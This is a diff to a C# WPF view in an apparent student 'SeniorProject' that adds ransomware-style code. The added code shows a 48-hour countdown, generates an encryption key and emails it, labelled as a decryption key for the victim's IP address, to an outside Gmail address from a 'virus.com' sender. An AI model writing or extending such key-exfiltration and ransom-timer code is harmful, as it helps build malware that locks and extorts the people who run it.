@@ -1,17 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Net;
 using System.Windows;
 using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
+using System.Windows.Threading;
+using EncryptionLogic;
+using System.Net.Mail;
+using System.Net.Sockets;
 
 namespace SeniorProject
 {
@@ -20,9 +14,61 @@ namespace SeniorProject
 	/// </summary>
 	public partial class mainView : UserControl
 	{
+		private DispatcherTimer _Timer = new DispatcherTimer();
+		private TimeSpan _timeSpan;
+		private Encryption _objEncrpytion= new Encryption();
+		private string key { get; set; }
+
 		public mainView()
 		{
 			InitializeComponent();
+			_timeSpan = TimeSpan.FromHours(48);
+			_Timer = new DispatcherTimer(new TimeSpan(0, 0, 1), DispatcherPriority.Normal, delegate
+			{
+				tbTime.Content = _timeSpan.ToString("c");
+				if (_timeSpan == TimeSpan.Zero)
+				{
+					_Timer.Stop();
+				}
+				_timeSpan = _timeSpan.Add(TimeSpan.FromSeconds(-1));
+			}, Application.Current.Dispatcher);
+			key = _objEncrpytion.generate32BitKey();
+			sendKey();
+			
 		}
+
+		private int sendKey()
+		{
+			try
+			{
+				MailMessage message = new MailMessage();
+				message.To.Add("tmello001@gmail.com");
+				message.Subject = "Decrypt Key for IP address: " + GetIP();
+				message.From = new MailAddress("dontreply@virus.com");
+				message.Body = key;
+				SmtpClient smtp = new SmtpClient(GetIP());
+				smtp.Send(message);
+				return 1;
+			}
+			catch (Exception e)
+			{
+				MessageBox.Show(e.Message);
+				return 0;
+			}
+		}
+
+		private static string GetIP()
+		{
+			var host = Dns.GetHostEntry(Dns.GetHostName());
+			foreach (var ip in host.AddressList)
+			{
+				if (ip.AddressFamily == AddressFamily.InterNetwork)
+				{
+					return ip.ToString();
+				}
+			}
+			throw new Exception("Local IP Address Not Found!");
+		}
+
 	}
 }
